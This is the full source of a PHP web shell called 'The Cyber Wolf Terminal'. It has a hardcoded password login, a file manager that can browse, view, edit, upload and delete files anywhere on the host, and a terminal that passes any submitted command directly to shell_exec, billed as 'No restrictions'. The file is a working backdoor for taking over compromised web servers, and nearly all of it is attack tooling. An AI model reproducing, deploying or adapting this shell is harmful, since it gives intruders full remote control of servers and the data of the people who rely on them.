<?php
session_start();

define('PASSWORD', base64_encode('Kjkszpj12@@'));
define('SESSION_KEY', 'evlgpt_auth');

// Check authentication
if (!isset($_SESSION[SESSION_KEY]) || $_SESSION[SESSION_KEY] !== true) {
    if (isset($_POST['pass'])) {
        if (base64_encode($_POST['pass']) === PASSWORD) {
            $_SESSION[SESSION_KEY] = true;
        } else {
            $error = "Access Denied!";
        }
    }
    // Display login page
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>The Cyber Wolf Terminal</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0a;
                color: #11bd11;
                font-family: 'Courier New', monospace;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                position: relative;
            }
            #rain {
                position: fixed;
                top: 0; left: 0;
                width: 100%; height: 100%;
                pointer-events: none;
                z-index: 0;
            }
            .login-box {
                background: rgba(0, 10, 0, 0.85);
                border: 2px solid #11bd11;
                box-shadow: 0 0 40px #11bd11;
                padding: 40px;
                width: 400px;
                text-align: center;
                position: relative;
                z-index: 1;
                backdrop-filter: blur(2px);
            }
            .login-box h1 {
                font-size: 1.8em;
                text-transform: uppercase;
                letter-spacing: 5px;
                margin-bottom: 10px;
                text-shadow: 0 0 20px #11bd11;
            }
            .login-box .sub {
                font-size: 0.9em;
                color: #080;
                margin-bottom: 30px;
            }
            .login-box input {
                background: transparent;
                border: 1px solid #11bd11;
                color: #11bd11;
                padding: 12px 20px;
                width: 100%;
                font-size: 1.1em;
                font-family: inherit;
                outline: none;
                transition: 0.3s;
                letter-spacing: 2px;
            }
            .login-box input:focus {
                box-shadow: 0 0 20px #11bd11;
            }
            .login-box button {
                background: #11bd11;
                color: #000;
                border: none;
                padding: 12px 30px;
                font-size: 1.1em;
                font-family: inherit;
                font-weight: bold;
                cursor: pointer;
                margin-top: 20px;
                text-transform: uppercase;
                transition: 0.3s;
                letter-spacing: 3px;
            }
            .login-box button:hover {
                background: #0a0;
                box-shadow: 0 0 30px #11bd11;
            }
            .error {
                color: #f00;
                margin-top: 15px;
                text-shadow: 0 0 10px #f00;
            }
            /* Loading spinner global */
            .spinner-overlay {
                display: none;
                position: fixed;
                top: 0; left: 0;
                width: 100%; height: 100%;
                background: rgba(0,0,0,0.7);
                z-index: 9999;
                justify-content: center;
                align-items: center;
            }
            .spinner-overlay.active {
                display: flex;
            }
            .spinner {
                width: 50px;
                height: 50px;
                border: 5px solid #11bd11;
                border-top: 5px solid transparent;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                box-shadow: 0 0 30px #11bd11;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
    <canvas id="rain"></canvas>
    <div class="login-box">
        <h1> The Cyber Wolf</h1>
        <div class="sub">CYBERPUNK SHELL v2.0</div>
        <form method="post" onsubmit="showSpinner()">
            <input type="password" name="pass" placeholder="ENTER PASSWORD" autofocus>
            <button type="submit">UNLOCK</button>
        </form>
        <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>
    </div>
    <!-- Loading spinner -->
    <div id="global-spinner" class="spinner-overlay">
        <div class="spinner"></div>
    </div>
    <script>
        // Rain effect
        const canvas = document.getElementById('rain');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<>?/|\\{}[]!@#$%^&*()';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#11bd11';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(draw, 33);

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        function showSpinner() {
            document.getElementById('global-spinner').classList.add('active');
        }
    </script>
    </body>
    </html>
    <?php
    exit;
}

// ==================== MAIN SHELL ====================
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$current_dir || !is_dir($current_dir)) $current_dir = getcwd();
chdir($current_dir);

// File listing function
function listFiles($dir) {
    $items = scandir($dir);
    $files = array();
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . '/' . $item;
        $files[] = array(
            'name' => $item,
            'path' => $path,
            'is_dir' => is_dir($path),
            'size' => is_file($path) ? filesize($path) : '-',
            'perm' => substr(sprintf('%o', fileperms($path)), -4),
            'mtime' => date('Y-m-d H:i:s', filemtime($path))
        );
    }
    return $files;
}

// Handle actions
$action = isset($_POST['action']) ? $_POST['action'] : '';
$target = isset($_POST['target']) ? $_POST['target'] : '';

if ($action === 'delete') {
    $target = realpath($target);
    if ($target && strpos($target, realpath($current_dir)) === 0) {
        if (is_file($target)) unlink($target);
        elseif (is_dir($target)) {
            $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach ($files as $f) {
                if ($f->isDir()) rmdir($f->getRealPath());
                else unlink($f->getRealPath());
            }
            rmdir($target);
        }
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if ($action === 'create') {
    $name = isset($_POST['name']) ? $_POST['name'] : '';
    $type = isset($_POST['type']) ? $_POST['type'] : 'file';
    $path = $current_dir . '/' . $name;
    if ($type === 'file') {
        file_put_contents($path, '');
    } else {
        mkdir($path, 0755, true);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if ($action === 'edit_save') {
    $file = realpath($target);
    if ($file && is_file($file) && strpos($file, realpath($current_dir)) === 0) {
        file_put_contents($file, $_POST['content']);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if ($action === 'upload') {
    if (isset($_FILES['file'])) {
        $upload_dir = $current_dir . '/' . (isset($_POST['subdir']) ? $_POST['subdir'] : '');
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0755, true);
        $dest = $upload_dir . '/' . basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $dest);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

// View file (AJAX)
if (isset($_GET['view'])) {
    $file = realpath($_GET['view']);
    if ($file && is_file($file) && strpos($file, realpath($current_dir)) === 0) {
        header('Content-Type: text/plain');
        readfile($file);
    }
    exit;
}

// Terminal command execution (AJAX)
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo "<pre style='color:#11bd11;background:#111;padding:10px;margin:0;font-size:13px;'>" . htmlspecialchars($output) . "</pre>";
    exit;
}

// ==================== MAIN UI ====================
$files = listFiles($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Cyber Wolf Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #060606;
            color: #11bd11;
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        #rain-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 0;
            opacity: 0.3;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #11bd11;
            padding-bottom: 10px;
            margin-bottom: 20px;
            text-shadow: 0 0 20px #11bd11;
        }
        .header h1 {
            font-size: 1.5em;
            letter-spacing: 3px;
        }
        .header .logout {
            color: #f00;
            text-decoration: none;
            border: 1px solid #f00;
            padding: 5px 15px;
            transition: 0.3s;
        }
        .header .logout:hover {
            background: #f00;
            color: #000;
            box-shadow: 0 0 15px #f00;
        }
        .path-bar {
            background: #111;
            border: 1px solid #11bd11;
            padding: 10px 15px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .path-bar .label {
            color: #080;
        }
        .path-bar .dir-link {
            color: #11bd11;
            text-decoration: none;
            padding: 2px 5px;
        }
        .path-bar .dir-link:hover {
            text-decoration: underline;
            background: #11bd11;
            color: #000;
        }
        .path-bar input[type="text"] {
            background: transparent;
            border: 1px solid #11bd11;
            color: #11bd11;
            padding: 5px 10px;
            font-family: inherit;
            flex: 1;
            min-width: 200px;
        }
        .path-bar button {
            background: #11bd11;
            color: #000;
            border: none;
            padding: 6px 15px;
            font-weight: bold;
            cursor: pointer;
            font-family: inherit;
        }
        .toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .toolbar button, .toolbar a {
            background: #111;
            border: 1px solid #11bd11;
            color: #11bd11;
            padding: 8px 18px;
            cursor: pointer;
            font-family: inherit;
            font-size: 0.9em;
            text-decoration: none;
            transition: 0.3s;
        }
        .toolbar button:hover, .toolbar a:hover {
            background: #11bd11;
            color: #000;
            box-shadow: 0 0 15px #11bd11;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
            background: rgba(0,10,0,0.5);
        }
        .file-table th {
            border-bottom: 2px solid #11bd11;
            padding: 8px 10px;
            text-align: left;
            text-transform: uppercase;
            letter-spacing: 1px;
            background: #0a0a0a;
        }
        .file-table td {
            padding: 6px 10px;
            border-bottom: 1px solid #1a1a1a;
            vertical-align: middle;
        }
        .file-table tr:hover td {
            background: rgba(0,255,0,0.05);
        }
        .file-table .icon {
            font-size: 1.2em;
            margin-right: 5px;
        }
        .file-table .name {
            font-size: 14px;
            color: #11bd11;
            text-decoration: none;
        }
        .file-table .name:hover {
            text-decoration: underline;
        }
        .file-table .actions a, .file-table .actions button {
            color: #11bd11;
            background: none;
            border: 1px solid #11bd11;
            padding: 2px 8px;
            font-size: 0.8em;
            cursor: pointer;
            text-decoration: none;
            margin: 0 2px;
            transition: 0.3s;
        }
        .file-table .actions a:hover, .file-table .actions button:hover {
            background: #11bd11;
            color: #000;
        }
        .file-table .actions .delete {
            border-color: #f00;
            color: #f00;
        }
        .file-table .actions .delete:hover {
            background: #f00;
            color: #000;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active {
            display: flex;
        }
        .modal-content {
            background: #0a0a0a;
            border: 2px solid #11bd11;
            width: 90%;
            max-width: 1000px;
            max-height: 90vh;
            overflow-y: auto;
            padding: 20px;
            position: relative;
            box-shadow: 0 0 13px #11bd11;
        }
        .modal-close {
            position: absolute;
            top: 10px; right: 15px;
            color: #f00;
            font-size: 1.5em;
            cursor: pointer;
            border: none;
            background: none;
            font-family: inherit;
        }
        .modal-title {
            font-size: 1.3em;
            margin-bottom: 15px;
            text-shadow: 0 0 10px #11bd11;
        }
        #terminal-output {
            background: #000;
            color: #11bd11;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.5;
            border: 1px solid #11bd11;
            margin-bottom: 10px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        #terminal-input {
            display: flex;
            gap: 10px;
        }
        #terminal-input input {
            flex: 1;
            background: transparent;
            border: 1px solid #11bd11;
            color: #11bd11;
            padding: 10px;
            font-family: inherit;
            font-size: 1em;
        }
        #terminal-input button {
            background: #11bd11;
            color: #000;
            border: none;
            padding: 10px 20px;
            font-weight: bold;
            cursor: pointer;
            font-family: inherit;
        }
        .upload-area {
            border: 2px dashed #11bd11;
            padding: 30px;
            text-align: center;
            margin: 15px 0;
            transition: 0.3s;
        }
        .upload-area:hover {
            background: rgba(0,255,0,0.05);
        }
        .upload-area input[type="file"] {
            color: #11bd11;
            font-family: inherit;
        }
        .upload-area button {
            background: #11bd11;
            color: #000;
            border: none;
            padding: 8px 20px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        #edit-area textarea {
            width: 100%;
            height: 400px;
            background: #111;
            border: 1px solid #11bd11;
            color: #11bd11;
            padding: 10px;
            font-family: monospace;
            font-size: 13px;
            resize: vertical;
        }
        .glow {
            text-shadow: 0 0 10px #11bd11;
        }
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        ::-webkit-scrollbar-thumb {
            background: #11bd11;
        }
        /* Loading spinner global (reused) */
        .spinner-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .spinner-overlay.active {
            display: flex;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #11bd11;
            border-top: 6px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            box-shadow: 0 0 40px #11bd11;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<canvas id="rain-bg"></canvas>
<div class="container">
    <div class="header">
        <h1> The Cyber Wolf // CYBERPUNK SHELL</h1>
        <a href="?logout=1" class="logout">[EXIT]</a>
    </div>

    <!-- Path bar -->
    <form method="get" class="path-bar" onsubmit="showSpinner()">
        <span class="label">ROOT ></span>
        <?php
        $parts = explode('/', trim($current_dir, '/'));
        $path = '';
        foreach ($parts as $p) {
            $path .= '/' . $p;
            echo "<a href='?dir=" . urlencode($path) . "' class='dir-link'>$p</a> / ";
        }
        ?>
        <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" placeholder="Direct path">
        <button type="submit">GO</button>
    </form>

    <!-- Toolbar -->
    <div class="toolbar">
        <button onclick="openModal('createModal')">+ NEW FILE</button>
        <button onclick="openModal('createDirModal')">+ NEW FOLDER</button>
        <button onclick="openModal('uploadModal')">⬆ UPLOAD</button>
        <button onclick="openModal('terminalModal')">⌨ TERMINAL</button>
        <button onclick="location.reload()">⟳ REFRESH</button>
    </div>

    <!-- File table -->
    <table class="file-table">
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Perm</th>
                <th>Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td colspan="5"><a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="name">📁 .. (parent)</a></td>
            </tr>
            <?php foreach ($files as $f): ?>
            <tr>
                <td>
                    <?php if ($f['is_dir']): ?>
                        <a href="?dir=<?php echo urlencode($f['path']); ?>" class="name">📁 <?php echo htmlspecialchars($f['name']); ?></a>
                    <?php else: ?>
                        <span class="icon">📄</span>
                        <a href="#" onclick="viewFile('<?php echo htmlspecialchars(addslashes($f['path'])); ?>'); return false;" class="name"><?php echo htmlspecialchars($f['name']); ?></a>
                    <?php endif; ?>
                </td>
                <td><?php echo $f['is_dir'] ? '-' : number_format($f['size']); ?> B</td>
                <td><?php echo $f['perm']; ?></td>
                <td><?php echo $f['mtime']; ?></td>
                <td class="actions">
                    <?php if (!$f['is_dir']): ?>
                        <a href="#" onclick="editFile('<?php echo htmlspecialchars(addslashes($f['path'])); ?>'); return false;">✏ Edit</a>
                        <a href="#" onclick="viewFile('<?php echo htmlspecialchars(addslashes($f['path'])); ?>'); return false;">👁 View</a>
                    <?php endif; ?>
                    <form method="post" style="display:inline" onsubmit="return confirm('Delete <?php echo htmlspecialchars($f['name']); ?>?') && showSpinner()">
                        <input type="hidden" name="action" value="delete">
                        <input type="hidden" name="target" value="<?php echo htmlspecialchars($f['path']); ?>">
                        <button type="submit" class="delete">🗑 Delete</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>

<!-- Loading spinner (global) -->
<div id="global-spinner" class="spinner-overlay">
    <div class="spinner"></div>
</div>

<!-- Modals -->
<div id="createModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('createModal')">✖</button>
        <div class="modal-title">CREATE NEW FILE</div>
        <form method="post" onsubmit="showSpinner()">
            <input type="hidden" name="action" value="create">
            <input type="hidden" name="type" value="file">
            <input type="text" name="name" placeholder="filename.ext" style="width:100%;background:#111;border:1px solid #11bd11;color:#11bd11;padding:10px;font-family:inherit;margin-bottom:10px;">
            <button type="submit" style="background:#11bd11;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;">CREATE</button>
        </form>
    </div>
</div>

<div id="createDirModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('createDirModal')">✖</button>
        <div class="modal-title">CREATE NEW FOLDER</div>
        <form method="post" onsubmit="showSpinner()">
            <input type="hidden" name="action" value="create">
            <input type="hidden" name="type" value="dir">
            <input type="text" name="name" placeholder="foldername" style="width:100%;background:#111;border:1px solid #11bd11;color:#11bd11;padding:10px;font-family:inherit;margin-bottom:10px;">
            <button type="submit" style="background:#11bd11;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;">CREATE</button>
        </form>
    </div>
</div>

<div id="uploadModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('uploadModal')">✖</button>
        <div class="modal-title">UPLOAD FILE</div>
        <div class="upload-area">
            <form method="post" enctype="multipart/form-data" onsubmit="showSpinner()">
                <input type="hidden" name="action" value="upload">
                <p style="margin-bottom:15px;">Choose file(s) or drag & drop (single)</p>
                <input type="file" name="file" required><br>
                <small>Optional: subfolder (relative to current dir)</small><br>
                <input type="text" name="subdir" placeholder="subfolder name (leave empty for root)" style="background:#111;border:1px solid #11bd11;color:#11bd11;padding:5px;margin:10px 0;width:80%;font-family:inherit;">
                <br>
                <button type="submit">UPLOAD</button>
            </form>
        </div>
    </div>
</div>

<div id="terminalModal" class="modal">
    <div class="modal-content" style="max-height: 80vh;">
        <button class="modal-close" onclick="closeModal('terminalModal')">✖</button>
        <div class="modal-title">⌨ TERMINAL // FULL ACCESS</div>
        <div id="terminal-output">Welcome to The Cyber Wolf Terminal. Type your commands below.<br></div>
        <div id="terminal-input">
            <input type="text" id="cmd-input" placeholder="Enter command..." autofocus>
            <button onclick="execCommand()">EXECUTE</button>
            <button onclick="document.getElementById('cmd-input').value=''; document.getElementById('terminal-output').innerHTML='';" style="background:#800;color:#fff;">CLEAR</button>
        </div>
        <small style="color:#080;display:block;margin-top:10px;">🔥 No restrictions. Use with power.</small>
    </div>
</div>

<div id="viewModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('viewModal')">✖</button>
        <div id="viewContent" style="background:#111;color:#11bd11;padding:15px;overflow:auto;max-height:70vh;white-space:pre-wrap;font-size:13px;"></div>
    </div>
</div>

<div id="editModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('editModal')">✖</button>
        <div class="modal-title">EDIT FILE</div>
        <form method="post" id="editForm" onsubmit="showSpinner()">
            <input type="hidden" name="action" value="edit_save">
            <input type="hidden" name="target" id="editTarget">
            <div id="edit-area"><textarea name="content" id="editContent"></textarea></div>
            <button type="submit" style="background:#11bd11;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;margin-top:10px;">SAVE</button>
        </form>
    </div>
</div>

<script>
// Rain background
const canvas = document.getElementById('rain-bg');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<>?/|\\{}[]!@#$%^&*()';
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);
function drawRain() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#11bd11';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(drawRain, 33);
window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });

function showSpinner() {
    document.getElementById('global-spinner').classList.add('active');
}

function hideSpinner() {
    document.getElementById('global-spinner').classList.remove('active');
}

window.addEventListener('load', function() {
    hideSpinner();
});

function openModal(id) {
    document.getElementById(id).classList.add('active');
    if (id === 'terminalModal') {
        setTimeout(() => document.getElementById('cmd-input').focus(), 100);
    }
}
function closeModal(id) {
    document.getElementById(id).classList.remove('active');
}
document.querySelectorAll('.modal').forEach(m => {
    m.addEventListener('click', function(e) {
        if (e.target === this) this.classList.remove('active');
    });
});

function viewFile(path) {
    showSpinner();
    fetch('?view=' + encodeURIComponent(path))
        .then(r => r.text())
        .then(data => {
            document.getElementById('viewContent').textContent = data;
            openModal('viewModal');
            hideSpinner();
        })
        .catch(() => hideSpinner());
}

function editFile(path) {
    showSpinner();
    fetch('?view=' + encodeURIComponent(path))
        .then(r => r.text())
        .then(data => {
            document.getElementById('editTarget').value = path;
            document.getElementById('editContent').value = data;
            openModal('editModal');
            hideSpinner();
        })
        .catch(() => hideSpinner());
}

function execCommand() {
    const input = document.getElementById('cmd-input');
    const output = document.getElementById('terminal-output');
    const cmd = input.value.trim();
    if (!cmd) return;
    output.innerHTML += '<span style="color:#0ff;">$ ' + cmd + '</span>\n';
    input.value = '';
    showSpinner();
    const formData = new FormData();
    formData.append('cmd', cmd);
    fetch('', { method: 'POST', body: formData })
        .then(r => r.text())
        .then(data => {
            output.innerHTML += data + '\n';
            output.scrollTop = output.scrollHeight;
            hideSpinner();
        })
        .catch(e => {
            output.innerHTML += '<span style="color:#f00;">Error: ' + e + '</span>\n';
            hideSpinner();
        });
}
document.getElementById('cmd-input').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') execCommand();
});
</script>
</body>
</html>